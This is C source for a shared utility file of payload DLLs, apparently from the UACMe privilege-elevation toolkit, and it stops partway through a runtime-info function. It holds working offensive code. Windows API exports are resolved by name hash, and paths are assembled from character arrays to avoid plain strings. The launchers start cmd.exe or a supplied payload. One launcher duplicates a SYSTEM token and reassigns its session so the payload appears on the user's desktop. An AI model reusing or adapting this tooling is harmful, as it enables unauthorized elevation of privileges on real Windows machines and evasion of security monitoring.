/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2024
*
*  TITLE:       UTIL.C
*
*  VERSION:     3.66
*
*  DATE:        03 Apr 2024
*
*  Global support routines file shared between payload dlls.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#undef _TRACE_CALL

#include "shared.h"

/*
* ucmxHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap.
*
*/
PVOID ucmxHeapAlloc(
    _In_ SIZE_T NumberOfBytes
)
{
    return RtlAllocateHeap(NtCurrentPeb()->ProcessHeap,
        HEAP_ZERO_MEMORY,
        NumberOfBytes);
}

/*
* ucmxHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap.
*
*/
BOOLEAN ucmxHeapFree(
    _In_ PVOID BaseAddress
)
{
    return RtlFreeHeap(NtCurrentPeb()->ProcessHeap,
        0,
        BaseAddress);
}

/*
* ucmIsProcess32bit
*
* Purpose:
*
* Return TRUE if given process is under WOW64, FALSE otherwise.
*
*/
BOOLEAN ucmIsProcess32bit(
    _In_ HANDLE hProcess
)
{
    NTSTATUS status;
    PROCESS_EXTENDED_BASIC_INFORMATION pebi;

    if (hProcess == NULL) {
        return FALSE;
    }

    //query if this is wow64 process
    RtlSecureZeroMemory(&pebi, sizeof(pebi));
    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pebi, sizeof(pebi), NULL);
    if (NT_SUCCESS(status)) {
        return (pebi.IsWow64Process == 1);
    }
    return FALSE;
}

/*
* ucmxQuerySystemDirectory
*
* Purpose:
*
* Query system directory full path including slash (with wow64 support).
*
*/
VOID ucmxQuerySystemDirectory(
    _Inout_ LPWSTR lpSystemDirectory,
    _In_ BOOLEAN CheckWow64)
{
    WCHAR szSystem32Prep[] = { L'\\', L's', L'y', L's', 0 };
    WCHAR szSystem32Final[] = { L't', L'e', L'm', L'3', L'2', L'\\', 0 };
    WCHAR szWow64Final[] = { L'w', L'o', L'w', L'6', L'4', L'\\', 0 };

    _strcpy(lpSystemDirectory, USER_SHARED_DATA->NtSystemRoot);
    _strcat(lpSystemDirectory, szSystem32Prep);

    if (CheckWow64) {
        if (ucmIsProcess32bit(NtCurrentProcess())) {
            _strcat(lpSystemDirectory, szWow64Final);
        }
        else {
            _strcat(lpSystemDirectory, szSystem32Final);
        }
    }
    else {
        _strcat(lpSystemDirectory, szSystem32Final);
    }
}

/*
* ucmBinTextEncode
*
* Purpose:
*
* Create pseudo random string from UI64 value.
*
*/
VOID ucmBinTextEncode(
    _In_ unsigned __int64 x,
    _Inout_ wchar_t* s
)
{
    char    tbl[64];
    char    c = 0;
    int     p;

    tbl[62] = '-';
    tbl[63] = '_';

    for (c = 0; c < 26; ++c)
    {
        tbl[c] = 'A' + c;
        tbl[26 + c] = 'a' + c;
        if (c < 10)
            tbl[52 + c] = '0' + c;
    }

    for (p = 0; p < 13; ++p)
    {
        c = x & 0x3f;
        x >>= 5;
        *s = (wchar_t)tbl[c];
        ++s;
    }

    *s = 0;
}

/*
* ucmGenerateSharedObjectName
*
* Purpose:
*
* Create pseudo random object name from it ID.
*
*/
VOID ucmGenerateSharedObjectName(
    _In_ WORD ObjectId,
    _Inout_ LPWSTR lpBuffer
)
{
    ULARGE_INTEGER value;

    value.LowPart = MAKELONG(
        MAKEWORD(UCM_VERSION_BUILD, UCM_VERSION_REVISION),
        MAKEWORD(UCM_VERSION_MINOR, UCM_VERSION_MAJOR));

    value.HighPart = MAKELONG(UACME_SHARED_BASE_ID, ObjectId);

    ucmBinTextEncode(value.QuadPart, lpBuffer);
}

/*
* ucmxCreateBoundaryDescriptorSID
*
* Purpose:
*
* Create special SID to access isolated namespace.
*
*/
PSID ucmxCreateBoundaryDescriptorSID(
    SID_IDENTIFIER_AUTHORITY* SidAuthority,
    UCHAR SubAuthorityCount,
    ULONG* SubAuthorities
)
{
    ULONG i;
    PSID  pSid;

    pSid = ucmxHeapAlloc(RtlLengthRequiredSid(SubAuthorityCount));
    if (pSid) {

        if (NT_SUCCESS(RtlInitializeSid(pSid, SidAuthority, SubAuthorityCount))) {

            for (i = 0; i < SubAuthorityCount; i++)
                *RtlSubAuthoritySid(pSid, i) = SubAuthorities[i];

            return pSid;

        }
        ucmxHeapFree(pSid);
    }
    return NULL;
}

/*
* ucmOpenAkagiNamespace
*
* Purpose:
*
* Open Akagi private namespace.
*
* Use NtClose on returned handle.
*
*/
HANDLE ucmOpenAkagiNamespace(
    VOID
)
{
    HANDLE hNamespace = NULL;
    HANDLE  hBoundary = NULL;
    PSID pWorldSid;
    SID_IDENTIFIER_AUTHORITY SidWorldAuthority = SECURITY_WORLD_SID_AUTHORITY;

    UNICODE_STRING usName;
    OBJECT_ATTRIBUTES obja = RTL_INIT_OBJECT_ATTRIBUTES((PUNICODE_STRING)NULL, 0);

    ULONG SubAuthoritiesWorld[] = { SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0 };
    WCHAR szBoundaryDescriptorName[128];

    RtlSecureZeroMemory(&szBoundaryDescriptorName, sizeof(szBoundaryDescriptorName));
    ucmGenerateSharedObjectName((WORD)AKAGI_BDESCRIPTOR_NAME_ID, szBoundaryDescriptorName);
    RtlInitUnicodeString(&usName, szBoundaryDescriptorName);

    do {
        //
        // Create and assign boundary descriptor.
        //
        hBoundary = RtlCreateBoundaryDescriptor(&usName, 0);
        if (hBoundary == NULL)
            break;

        pWorldSid = ucmxCreateBoundaryDescriptorSID(
            &SidWorldAuthority,
            1,
            SubAuthoritiesWorld);

        if (pWorldSid == NULL)
            break;

        if (!NT_SUCCESS(RtlAddSIDToBoundaryDescriptor(&hBoundary, pWorldSid))) {
            break;
        }

        if (!NT_SUCCESS(NtOpenPrivateNamespace(
            &hNamespace,
            MAXIMUM_ALLOWED,
            &obja,
            hBoundary)))
        {
            break;
        }

    } while (FALSE);

    if (hBoundary) RtlDeleteBoundaryDescriptor(hBoundary);

    return hNamespace;
}

/*
* ucmReadSharedParameters
*
* Purpose:
*
* Read shared parameters from Akagi.
*
* Return TRUE on success, FALSE otherwise.
*
*/
_Success_(return == TRUE)
BOOL ucmReadSharedParameters(
    _Out_ UACME_PARAM_BLOCK * SharedParameters
)
{
    BOOL bResult = FALSE;
    ULONG Crc32;
    HANDLE hNamespace = NULL, hSection = NULL;
    PVOID SectionBuffer = NULL;
    SIZE_T ViewSize = PAGE_SIZE;

    UNICODE_STRING usName;
    OBJECT_ATTRIBUTES obja;

    UACME_PARAM_BLOCK sharedParameters;
    WCHAR szSectionName[128];

    do {

        hNamespace = ucmOpenAkagiNamespace();
        if (hNamespace == NULL)
            break;

        RtlSecureZeroMemory(&szSectionName, sizeof(szSectionName));
        ucmGenerateSharedObjectName((WORD)AKAGI_SHARED_SECTION_ID, szSectionName);
        RtlInitUnicodeString(&usName, szSectionName);

        InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, hNamespace, NULL);
        if (NT_SUCCESS(NtOpenSection(&hSection, SECTION_ALL_ACCESS, &obja))) {
            if (NT_SUCCESS(NtMapViewOfSection(
                hSection,
                NtCurrentProcess(),
                &SectionBuffer,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                MEM_TOP_DOWN,
                PAGE_READONLY)))
            {
                RtlSecureZeroMemory(&sharedParameters, sizeof(UACME_PARAM_BLOCK));
                RtlCopyMemory(&sharedParameters, SectionBuffer, sizeof(UACME_PARAM_BLOCK));
                NtUnmapViewOfSection(NtCurrentProcess(), hSection);

                //
                // Validate data.
                //
                Crc32 = sharedParameters.Crc32;
                sharedParameters.Crc32 = 0;
                if (Crc32 == RtlComputeCrc32(0, &sharedParameters, sizeof(UACME_PARAM_BLOCK))) {
                    sharedParameters.Crc32 = Crc32;
                    RtlCopyMemory(SharedParameters, &sharedParameters, sizeof(UACME_PARAM_BLOCK));
                    bResult = TRUE;
                }
            }
            NtClose(hSection);
        }
        NtClose(hNamespace);

    } while (FALSE);

    return bResult;
}

/*
* ucmSetCompletion
*
* Purpose:
*
* Notify Akagi about task completion.
*
*/
VOID ucmSetCompletion(
    _In_ LPWSTR lpEvent
)
{
    HANDLE hEvent = NULL, hNamespace = NULL;
    UNICODE_STRING usName;
    OBJECT_ATTRIBUTES obja;

    hNamespace = ucmOpenAkagiNamespace();
    if (hNamespace) {

        RtlInitUnicodeString(&usName, lpEvent);
        InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, hNamespace, NULL);
        if (NT_SUCCESS(NtOpenEvent(&hEvent, EVENT_ALL_ACCESS, &obja))) {
            NtSetEvent(hEvent, NULL);
            NtClose(hEvent);
        }
        NtClose(hNamespace);
    }
}

/*
* ucmPrivilegeEnabled
*
* Purpose:
*
* Tests if the given token has the given privilege enabled/enabled by default.
*
*/
BOOLEAN ucmPrivilegeEnabled(
    _In_ HANDLE hToken,
    _In_ ULONG Privilege
)
{
    NTSTATUS status;
    PRIVILEGE_SET Privs;
    BOOLEAN bResult = FALSE;

    Privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
    Privs.PrivilegeCount = 1;
    Privs.Privilege[0].Luid.LowPart = Privilege;
    Privs.Privilege[0].Luid.HighPart = 0;
    Privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;

    status = NtPrivilegeCheck(hToken, &Privs, &bResult);
    RtlSetLastWin32Error(RtlNtStatusToDosError(status));

    return bResult;
}

/*
* ucmFormatTimeOut
*
* Purpose:
*
* Translates a Win32 style timeout to an NT relative timeout.
*
*/
PLARGE_INTEGER ucmFormatTimeOut(
    _Out_ PLARGE_INTEGER TimeOut,
    _In_ DWORD Milliseconds
)
{
    if ((LONG)Milliseconds == -1) {
        return(NULL);
    }
    TimeOut->QuadPart = UInt32x32To64(Milliseconds, 10000);
    TimeOut->QuadPart *= -1;
    return TimeOut;
}

/*
* ucmSleep
*
* Purpose:
*
* Win32 Sleep replacement.
*
*/
VOID ucmSleep(
    _In_ DWORD Miliseconds
)
{
    LARGE_INTEGER liDueTime;

    if (Miliseconds == INFINITE) {
        liDueTime.QuadPart = 0x8000000000000000;
    }
    else {
        ucmFormatTimeOut(&liDueTime, Miliseconds);
    }
    NtDelayExecution(FALSE, &liDueTime);
}

/*
* ucmCreateSyncMutant
*
* Purpose:
*
* Create sync mutex.
*
*/
NTSTATUS ucmCreateSyncMutant(
    _Out_ PHANDLE phMutant
)
{
    UNICODE_STRING usName;
    OBJECT_ATTRIBUTES obja;

    WCHAR szObjectName[256];
    WCHAR szName[128];

    RtlSecureZeroMemory(&szName, sizeof(szName));
    _strcpy(szObjectName, L"\\BaseNamedObjects\\");
    ucmGenerateSharedObjectName(FUBUKI_SYNC_MUTEX_ID, szName);
    _strcat(szObjectName, szName);

    RtlInitUnicodeString(&usName, szObjectName);
    InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    return NtCreateMutant(phMutant, MUTANT_ALL_ACCESS, &obja, FALSE);
}

/*
* ucmGetHashForString
*
* Purpose:
*
* Calculates specific hash for string.
*
*/
DWORD ucmGetHashForString(
    _In_ char* s
)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

/*
* ucmGetProcedureAddressByHash
*
* Purpose:
*
* Return pointer to function in dll from name hash value.
*
*/
LPVOID ucmGetProcedureAddressByHash(
    _In_ PVOID ImageBase,
    _In_ DWORD ProcedureHash
)
{
    DWORD i;
    ULONG sz = 0;

    IMAGE_DOS_HEADER* DosHeader;
    IMAGE_EXPORT_DIRECTORY* Exports;
    PDWORD Names, Functions;
    PWORD Ordinals;

    DWORD_PTR FunctionPtr;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;

    Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(ImageBase,
        TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT,
        &sz);

    if (Exports == NULL)
        return NULL;

    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);
    Ordinals = (PWORD)((PBYTE)DosHeader + Exports->AddressOfNameOrdinals);
    Functions = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfFunctions);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        if (ucmGetHashForString((char*)((PBYTE)DosHeader + Names[i])) == ProcedureHash) {
            FunctionPtr = Functions[Ordinals[i]];
            return (PBYTE)ImageBase + FunctionPtr;
        }
    }

    return NULL;
}

/*
* ucmGetStartupInfo
*
* Purpose:
*
* Reimplemented GetStartupInfoW.
*
*/
VOID ucmGetStartupInfo(
    _In_ LPSTARTUPINFOW lpStartupInfo
)
{
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;

    if (lpStartupInfo == NULL) {
        return;
    }

    ProcessParameters = NtCurrentPeb()->ProcessParameters;

    lpStartupInfo->cb = sizeof(*lpStartupInfo);
    lpStartupInfo->lpReserved = (LPWSTR)ProcessParameters->ShellInfo.Buffer;
    lpStartupInfo->lpDesktop = (LPWSTR)ProcessParameters->DesktopInfo.Buffer;
    lpStartupInfo->lpTitle = (LPWSTR)ProcessParameters->WindowTitle.Buffer;
    lpStartupInfo->dwX = ProcessParameters->StartingX;
    lpStartupInfo->dwY = ProcessParameters->StartingY;
    lpStartupInfo->dwXSize = ProcessParameters->CountX;
    lpStartupInfo->dwYSize = ProcessParameters->CountY;
    lpStartupInfo->dwXCountChars = ProcessParameters->CountCharsX;
    lpStartupInfo->dwYCountChars = ProcessParameters->CountCharsY;
    lpStartupInfo->dwFillAttribute = ProcessParameters->FillAttribute;
    lpStartupInfo->dwFlags = ProcessParameters->WindowFlags;
    lpStartupInfo->wShowWindow = (WORD)ProcessParameters->ShowWindowFlags;
    lpStartupInfo->cbReserved2 = ProcessParameters->RuntimeData.Length;
    lpStartupInfo->lpReserved2 = (LPBYTE)ProcessParameters->RuntimeData.Buffer;

    if (lpStartupInfo->dwFlags & (STARTF_USESTDHANDLES | STARTF_USEHOTKEY)) {
        lpStartupInfo->hStdInput = ProcessParameters->StandardInput;
        lpStartupInfo->hStdOutput = ProcessParameters->StandardOutput;
        lpStartupInfo->hStdError = ProcessParameters->StandardError;
    }
}

/*
* ucmExpandEnvironmentStrings
*
* Purpose:
*
* Reimplemented ExpandEnvironmentStrings.
*
*/
DWORD ucmExpandEnvironmentStrings(
    _In_ LPCWSTR lpSrc,
    _Out_writes_to_opt_(nSize, return) LPWSTR lpDst,
    _In_ DWORD nSize
)
{
    NTSTATUS Status;
    SIZE_T SrcLength = 0, ReturnLength = 0, DstLength = (SIZE_T)nSize;

    if (lpSrc) {
        SrcLength = _strlen(lpSrc);
    }

    Status = RtlExpandEnvironmentStrings(
        NULL,
        (PWSTR)lpSrc,
        SrcLength,
        (PWSTR)lpDst,
        DstLength,
        &ReturnLength);

    if ((NT_SUCCESS(Status)) || (Status == STATUS_BUFFER_TOO_SMALL)) {

        if (ReturnLength <= MAXDWORD32)
            return (DWORD)ReturnLength;

        Status = STATUS_UNSUCCESSFUL;
    }
    RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
    return 0;
}

#define SI_MAX_BUFFER_LENGTH (512 * 1024 * 1024)

/*
* ucmGetSystemInfo
*
* Purpose:
*
* Returns buffer with system information by given InfoClass.
*
* Returned buffer must be freed with HeapFree after usage.
*
*/
PVOID ucmGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass
)
{
    PVOID       buffer = NULL;
    ULONG       bufferSize = PAGE_SIZE;
    NTSTATUS    ntStatus;
    ULONG       returnedLength = 0;

    buffer = ucmxHeapAlloc((SIZE_T)bufferSize);
    if (buffer == NULL)
        return NULL;

    while ((ntStatus = NtQuerySystemInformation(
        SystemInformationClass,
        buffer,
        bufferSize,
        &returnedLength)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        ucmxHeapFree(buffer);
        bufferSize *= 2;

        if (bufferSize > SI_MAX_BUFFER_LENGTH)
            return NULL;

        buffer = ucmxHeapAlloc((SIZE_T)bufferSize);
    }

    if (NT_SUCCESS(ntStatus)) {
        return buffer;
    }

    if (buffer)
        ucmxHeapFree(buffer);

    return NULL;
}

/*
* ucmLaunchPayload
*
* Purpose:
*
* Run payload (by default cmd.exe from system32)
*
*/
BOOL ucmLaunchPayload(
    _In_opt_ LPWSTR pszPayload,
    _In_opt_ DWORD cbPayload)
{
    BOOL                    bResult = FALSE, bCommandLineAllocated = FALSE;
    WCHAR                   cmdbuf[MAX_PATH * 2]; //complete process command line
    WCHAR                   sysdir[MAX_PATH + 1]; //process working directory
    STARTUPINFO             startupInfo;
    PROCESS_INFORMATION     processInfo;

    DWORD                   dwCreationFlags = CREATE_NEW_CONSOLE;

    LPWSTR                  lpApplicationName = NULL, lpCommandLine = NULL;
    SIZE_T                  memIO;


    //
    // Query working directory.
    //
    RtlSecureZeroMemory(sysdir, sizeof(sysdir));
    ucmxQuerySystemDirectory(sysdir, TRUE);

    //
    // Query startup info from parent.
    //
    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    ucmGetStartupInfo(&startupInfo);

    //
    // Determine what we want to execute, custom parameter or default cmd.exe
    //
    if (pszPayload && cbPayload) {

        //
        // We can use custom payload, copy it to internal buffer.
        //
        memIO = PAGE_SIZE + (SIZE_T)cbPayload;

        lpCommandLine = (LPWSTR)ucmxHeapAlloc(memIO);

        if (lpCommandLine) {

            dwCreationFlags = 0;
            bCommandLineAllocated = TRUE;

            RtlCopyMemory(lpCommandLine,
                pszPayload,
                cbPayload);

        }
    }
    else {

        //
        // Default cmd.exe should be started.
        //
        RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
        _strcpy(cmdbuf, sysdir);
        _strcat(cmdbuf, L"cmd.exe");

        lpApplicationName = cmdbuf;
        lpCommandLine = NULL;
        bCommandLineAllocated = FALSE;
    }

    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    startupInfo.wShowWindow = SW_SHOW;

    RtlSecureZeroMemory(&processInfo, sizeof(processInfo));

#ifdef _TRACE_CALL
    OutputDebugString(L"CreateProcessAsUser\r\n");
#endif

    //
    // Launch payload.
    //
    bResult = CreateProcessAsUser(NULL,
        lpApplicationName,
        lpCommandLine,
        NULL,
        NULL,
        FALSE,
        dwCreationFlags,
        NULL,
        sysdir,
        &startupInfo,
        &processInfo);

    if (bResult) {
        //
        // We don't need these handles, close them.
        //
        NtClose(processInfo.hProcess);
        NtClose(processInfo.hThread);
    }

    //
    // Post execution cleanup if required.
    //
    if (bCommandLineAllocated)
        ucmxHeapFree(lpCommandLine);

    return bResult;
}

/*
* ucmLaunchPayloadEx
*
* Purpose:
*
* Run payload (by default cmd.exe from system32)
*
*/
BOOL ucmLaunchPayloadEx(
    _In_ PFNCREATEPROCESSW pCreateProcess,
    _In_opt_ LPWSTR pszPayload,
    _In_opt_ DWORD cbPayload)
{
    BOOL                    bResult = FALSE, bCommandLineAllocated = FALSE;
    WCHAR                   cmdbuf[MAX_PATH * 2]; //complete process command line
    WCHAR                   sysdir[MAX_PATH + 1]; //process working directory
    STARTUPINFO             startupInfo;
    PROCESS_INFORMATION     processInfo;

    DWORD                   dwCreationFlags = CREATE_NEW_CONSOLE;

    LPWSTR                  lpApplicationName = NULL, lpCommandLine = NULL;
    SIZE_T                  memIO;

    if (pCreateProcess == NULL)
        return bResult;

    //
    // Query working directory.
    //
    RtlSecureZeroMemory(sysdir, sizeof(sysdir));
    ucmxQuerySystemDirectory(sysdir, TRUE);

    //
    // Query startup info from parent.
    //
    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    ucmGetStartupInfo(&startupInfo);

    //
    // Determine what we want to execute, custom parameter or default cmd.exe
    //
    if (pszPayload && cbPayload) {

        //
        // We can use custom payload, copy it to internal buffer.
        //
        memIO = PAGE_SIZE + (SIZE_T)cbPayload;

        lpCommandLine = (LPWSTR)ucmxHeapAlloc(memIO);

        if (lpCommandLine) {

            dwCreationFlags = 0;
            bCommandLineAllocated = TRUE;

            RtlCopyMemory(lpCommandLine,
                pszPayload,
                cbPayload);

        }
    }
    else {

        //
        // Default cmd.exe should be started.
        //
        RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
        _strcpy(cmdbuf, sysdir);
        _strcat(cmdbuf, L"cmd.exe");

        lpApplicationName = cmdbuf;
        lpCommandLine = NULL;
        bCommandLineAllocated = FALSE;
    }

    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    startupInfo.wShowWindow = SW_SHOW;

    RtlSecureZeroMemory(&processInfo, sizeof(processInfo));

    //
    // Launch payload.
    //
    bResult = pCreateProcess(
        lpApplicationName,
        lpCommandLine,
        NULL,
        NULL,
        FALSE,
        dwCreationFlags,
        NULL,
        sysdir,
        &startupInfo,
        &processInfo);

    if (bResult) {
        //
        // We don't need these handles, close them.
        //
        NtClose(processInfo.hProcess);
        NtClose(processInfo.hThread);
    }

    //
    // Post execution cleanup if required.
    //
    if (bCommandLineAllocated)
        ucmxHeapFree(lpCommandLine);

    return bResult;
}

/*
* ucmLaunchPayload2
*
* Purpose:
*
* Run payload (by default cmd.exe from system32)
*
*/
BOOL ucmLaunchPayload2(
    _In_ PFNCREATEPROCESSASUSERW pCreateProcessAsUser,
    _In_ BOOL bIsLocalSystem,
    _In_ ULONG SessionId,
    _In_opt_ LPWSTR pszPayload,
    _In_opt_ DWORD cbPayload)
{
    BOOL                        bResult = FALSE, bCommandLineAllocated = FALSE, bSrvExec = FALSE;
    WCHAR                       cmdbuf[MAX_PATH * 2]; //complete process command line
    WCHAR                       sysdir[MAX_PATH + 1]; //process working directory
    STARTUPINFO                 startupInfo;
    PROCESS_INFORMATION         processInfo;

    DWORD                       dwCreationFlags = CREATE_NEW_CONSOLE;

    LPWSTR                      lpApplicationName = NULL, lpCommandLine = NULL;
    SIZE_T                      memIO;

    NTSTATUS                    status;
    HANDLE                      hToken = NULL, hDupToken = NULL;
    SECURITY_QUALITY_OF_SERVICE sqos;
    OBJECT_ATTRIBUTES           obja;

    ULONG                       CurrentSessionId = NtCurrentPeb()->SessionId;

#ifdef _TRACE_CALL
    WCHAR                       szDebugBuf[1000];
#endif //_TRACE_CALL

    do {

        bSrvExec = ((bIsLocalSystem) && (CurrentSessionId != SessionId));

#ifdef _TRACE_CALL
        if (bSrvExec)
            OutputDebugString(L"bServExec");
#endif //_TRACE_CALL

        //
        // In case of service start, prepare token for CreateProcessAsUser.
        // Set token session id, to do this we need SE_TCB_PRIVILEGE, check it enabled.
        //
        if (bSrvExec) {

            status = NtOpenProcessToken(
                NtCurrentProcess(),
                TOKEN_ALL_ACCESS,
                &hToken);

            if (!NT_SUCCESS(status)) {
#ifdef _TRACE_CALL
                _strcpy(szDebugBuf, L"NtOpenProcessToken = 0x");
                ultohex(status, _strend(szDebugBuf));
                _strcat(szDebugBuf, L"\r\n");
                OutputDebugString(szDebugBuf);
#endif  //_TRACE_CALL
                break;
            }

#ifdef _TRACE_CALL
            if (!ucmPrivilegeEnabled(hToken, SE_ASSIGNPRIMARYTOKEN_PRIVILEGE)) {
                OutputDebugString(L"ucmPrivilegeEnabled->SE_ASSIGNPRIMARYTOKEN_PRIVILEGE not set\r\n");
            }
#endif //_TRACE_CALL

            if (!ucmPrivilegeEnabled(hToken, SE_TCB_PRIVILEGE)) {
#ifdef _TRACE_CALL
                OutputDebugString(L"ucmPrivilegeEnabled->SE_TCB_PRIVILEGE not set\r\n");
#endif //_TRACE_CALL
                break;
            }

            sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
            sqos.ImpersonationLevel = SecurityImpersonation;
            sqos.ContextTrackingMode = 0;
            sqos.EffectiveOnly = FALSE;
            InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
            obja.SecurityQualityOfService = &sqos;

            status = NtDuplicateToken(
                hToken,
                TOKEN_ALL_ACCESS,
                &obja,
                FALSE,
                TokenPrimary,
                &hDupToken);

            if (!NT_SUCCESS(status)) {
#ifdef _TRACE_CALL
                _strcpy(szDebugBuf, L"NtDuplicateToken = 0x");
                ultohex(status, _strend(szDebugBuf));
                _strcat(szDebugBuf, L"\r\n");
                OutputDebugString(szDebugBuf);
#endif //_TRACE_CALL
                break;
            }

            status = NtSetInformationToken(
                hDupToken,
                TokenSessionId,
                (PVOID)&SessionId,
                sizeof(ULONG));

            if (!NT_SUCCESS(status)) {
#ifdef _TRACE_CALL
                _strcpy(szDebugBuf, L"NtSetInformationToken = 0x");
                ultohex(status, _strend(szDebugBuf));
                _strcat(szDebugBuf, L"\r\n");
                OutputDebugString(szDebugBuf);
#endif //_TRACE_CALL
                break;
            }

        }
        else {
            //
            // Not a service start, use default token value.
            //
            hDupToken = NULL;
        }

        //
        // Query working directory.
        //
        RtlSecureZeroMemory(sysdir, sizeof(sysdir));
        ucmxQuerySystemDirectory(sysdir, FALSE);

#ifdef _TRACE_CALL
        OutputDebugString(sysdir);
#endif //_TRACE_CALL

        //
        // Query startup info from parent.
        //
        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        ucmGetStartupInfo(&startupInfo);

        //
        // Determine what we want to execute, custom parameter or default cmd.exe
        //
        if (pszPayload && cbPayload) {

            //
            // We can use custom payload, copy it to internal buffer.
            //
            memIO = PAGE_SIZE + (SIZE_T)cbPayload;

            lpCommandLine = (LPWSTR)ucmxHeapAlloc(memIO);

            if (lpCommandLine) {

                dwCreationFlags = 0;
                bCommandLineAllocated = TRUE;

                RtlCopyMemory(lpCommandLine,
                    pszPayload,
                    cbPayload);

            }
        }
        else {

            //
            // Default cmd.exe should be started.
            //
            RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
            _strcpy(cmdbuf, sysdir);
            _strcat(cmdbuf, L"cmd.exe");

            lpApplicationName = cmdbuf;
            lpCommandLine = NULL;
            bCommandLineAllocated = FALSE;
        }

        startupInfo.dwFlags = STARTF_USESHOWWINDOW;
        startupInfo.wShowWindow = SW_SHOW;

        RtlSecureZeroMemory(&processInfo, sizeof(processInfo));

        //
        // In case of start from service, force default WinStation and Desktop.
        //
        // Future note: maybe moved to registry settings as custom winsta param.
        //
        if (bSrvExec) {
            startupInfo.lpDesktop = TEXT("Winsta0\\Default");
        }

        //
        // Launch payload.
        //
        bResult = pCreateProcessAsUser(
            hDupToken,
            lpApplicationName,
            lpCommandLine,
            NULL,
            NULL,
            FALSE,
            dwCreationFlags,
            NULL,
            sysdir,
            &startupInfo,
            &processInfo);

        if (bResult) {
#ifdef _TRACE_CALL
            OutputDebugString(L"CreateProcessAsUser success\r\n");
#endif //_TRACE_CALL
            //
            // We don't need these handles, close them.
            //
            NtClose(processInfo.hProcess);
            NtClose(processInfo.hThread);
        }
#ifdef _TRACE_CALL
        else {
            _strcpy(szDebugBuf, L"CreateProcessAsUser failed with code = 0x");
            ultohex(GetLastError(), _strend(szDebugBuf));
            _strcat(szDebugBuf, L"\r\n");
            OutputDebugString(szDebugBuf);
        }

#endif //_TRACE_CALL
    } while (FALSE);

    //
    // Post execution cleanup if required.
    //
    if (bCommandLineAllocated)
        ucmxHeapFree(lpCommandLine);

    if (bSrvExec) {
        if (hToken)
            NtClose(hToken);
        if (hDupToken)
            NtClose(hDupToken);
    }

    return bResult;
}


/*
* ucmQueryRuntimeInfo
*
* Purpose:
*
* Output current process runtime information.
*
*/
LPWSTR ucmQueryRuntimeInfo(
    _In_ BOOL ReturnData)
{
    BOOL bFound = FALSE;
    NTSTATUS status;
    DWORD dwIntegrityLevel;
    ULONG LengthNeeded = 0;
    ULONG SessionId = NtCurrentPeb()->SessionId;

    HANDLE hToken = NULL;

    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    TOKEN_USER* ptu = NULL;

    PROCESS_BASIC_INFORMATION pbi;
    PROCESS_EXTENDED_BASIC_INFORMATION pebi;
    PSYSTEM_PROCESS_INFORMATION ProcessList, pList;

    LSA_OBJECT_ATTRIBUTES lobja;
    LSA_HANDLE PolicyHandle = NULL;
    PLSA_REFERENCED_DOMAIN_LIST ReferencedDomains = NULL;
    PLSA_TRANSLATED_NAME Names = NULL;
    SECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;

    LPWSTR lpReport, lpValue = TEXT("Unknown");

    WCHAR szBuffer[MAX_PATH + 1];

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    if (GetModuleFileName(NULL, (LPWSTR)&szBuffer, MAX_PATH) == 0)
        return NULL;

    lpReport = (LPWSTR)ucmxHeapAlloc(2 * PAGE_SIZE);
    if (lpReport == NULL)
        return NULL;

    //
    // 1. Attach module name.
    //
    _strncpy(lpReport, MAX_PATH, szBuffer, MAX_PATH);

    //
    // 2. Inherited from.
    //
    RtlSecureZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
    status = NtQueryInformationProcess(
        NtCurrentProcess(),
        ProcessBasicInformation,
        &pbi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &LengthNeeded);

    if (NT_SUCCESS(status)) {

        _strcpy(szBuffer, TEXT("\r\nInherited from PID="));
#ifdef _WIN64
        u64tostr(pbi.InheritedFromUniqueProcessId, _strend(szBuffer));
#else 
        ultostr((ULONG)pbi.InheritedFromUniqueProcessId, _strend(szBuffer));
#endif
